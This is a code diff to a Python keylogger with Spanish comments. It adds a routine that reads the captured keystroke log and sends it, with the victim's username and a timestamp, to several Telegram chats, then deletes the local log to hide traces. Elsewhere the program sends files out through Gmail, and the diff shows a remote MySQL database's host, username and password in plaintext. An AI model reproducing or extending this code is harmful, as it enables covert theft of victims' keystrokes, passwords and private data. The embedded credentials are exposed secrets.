@@ -20,7 +20,7 @@ from winreg import *            # Modifica registros de Windows
 import datetime                 # Devuelve fecha y hora actual
 import random                   # Genera numeros
 import os                       # Lib para copiar archivos
-import telebot
+import telebot                  # Telegram API
 import yagmail                  # Enviar archivos solo a Gmail
 import pymysql                  # Lib connection mysql
 import shutil                   # Lib para crear carpetas
@@ -54,7 +54,7 @@ class Config:
             self.HOSTNAME = "bh1g5gnxzw2igrvui8hq-mysql.services.clever-cloud.com"  # HostName
             self.USERNAME = "udwlsyrbtldkznqo"                                      # Username
             self.PASSWORD = "OR2i2dfdgWek0UDiAv4f"                                  # Password
-            self.DB_NAME  = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
+            self.DATABASE = "bh1g5gnxzw2igrvui8hq"                                  # DataBase Name
             self.PORT     = "3306"                                                  # Port
     class Gmail:
         def __init__(self):
@@ -191,10 +191,45 @@ class Util:
         elif Functions.SendGmail(homedir, Config.Gmail().GMAIL_3, Config.Gmail().PASS_3, Config.Gmail().RECEIVERS):
             os.remove(homedir)
 
+    def TelegramBot(self):
+        try:
+            print("[TelegramBot] Proceso...")
+            pathN = Config().LOG_KEY_PATH + Functions().RandomChar(23) + ".txt"
+            os.rename(Config().PATH_KEY, pathN)
+            # Abre el archivo
+            f = open(pathN, 'r')
+            T = datetime.datetime.now()
+            currentTime = T.strftime("%A") + " " + T.strftime("%d") + " de " + T.strftime("%B") + " " + T.strftime(
+                "%I") + ":" + T.strftime("%M") + " " + T.strftime("%p")
+            try:
+                bot = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
+                bot.send_message(Config.TelegramBot().ID,"Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n"+f.read())
+                print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID 1] ="+str(Config.TelegramBot().ID))
 
+                if Config.TelegramBot().ID_2 != 000000000:
+                    bot2 = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
+                    bot2.send_message(Config.TelegramBot().ID_2,"Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n" + f.read())
+                    print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID 1] =" + str(Config.TelegramBot().ID_2))
 
+                if Config.TelegramBot().ID_3 != 000000000:
+                    bot3 = telebot.TeleBot(Config.TelegramBot().TOKEN)  # Instancia
+                    bot3.send_message(Config.TelegramBot().ID_3, "Usuario: " + str(getuser()) + "\nFecha: " + currentTime + "\n=>\n=>\n" + f.read())
+                    print("[TelegramBot] Se obtuvo el registro de teclas y se envió a Telegram [ID 1] =" + str(Config.TelegramBot().ID_3))
 
+                f.close()
+                os.remove(pathN)
+                print("[TelegramBot] Se eliminó el archivo caché correctamente")
+            except:
+                print("[Telegram] Error al subir el registro")
+        except:
+            try:
+                f.close()
+                os.remove(pathN)  # Borra la carpeta por posible Errores
+            except:
+                pass
+            print("[Telegram] No se encuentra el archivo")
 
+   
 
 
 
